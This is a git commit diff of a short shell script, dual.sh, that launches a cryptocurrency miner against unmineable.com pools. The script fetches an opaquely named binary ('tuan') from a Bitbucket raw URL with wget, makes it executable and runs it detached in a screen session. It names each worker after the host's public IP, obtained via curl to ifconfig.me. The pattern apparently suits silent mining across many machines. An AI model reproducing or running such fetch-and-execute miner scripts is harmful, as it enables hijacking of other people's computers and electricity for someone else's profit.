3b23c994786d41286d36a44ea2d8b42584cea438
jrkeiter <91981745+jrkeiter@users.noreply.github.com>
2021-11-22 16:32:11 -0800

    Update dual.sh

--- dual.sh
+++ dual.sh
@@ -1,7 +1,8 @@
-WALLET=SHIB:0x9ffded4cf417cbf75ed73e4bbe3ee7df30d9ec46
-POOL1=ethash-eu.unmineable.com:3333
-POOL2=etchash.unmineable.com:3333
-WORKER=Oagger
+WALLET=USDT:0x9ffded4cf417cbf75ed73e4bbe3ee7df30d9ec46
+POOL1=ethash.unmineable.com:3333
+POOL2=etchash.unmineable.com:13333
+WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-MOON
+COMA="--pool $POOL1 --user $WALLET.$WORKER --dualmode etc --dualstratum $WALLET.$WORKER@$POOL2"
 
 
 
@@ -12,4 +13,4 @@ else
     wget https://bitbucket.org/solomase/garangsem/raw/d261db312adaef2baefd19624650e14af8c938dc/tuan
     chmod +x ./tuan
 fi
-screen -dmLS mine ./tuan --algo ETHASH --pool $POOL1 --user $WALLET.$WORKER --dualmode etc --dualstratum $WALLET.$WORKER@$POOL2
+screen -dmLS mine ./tuan $COMA
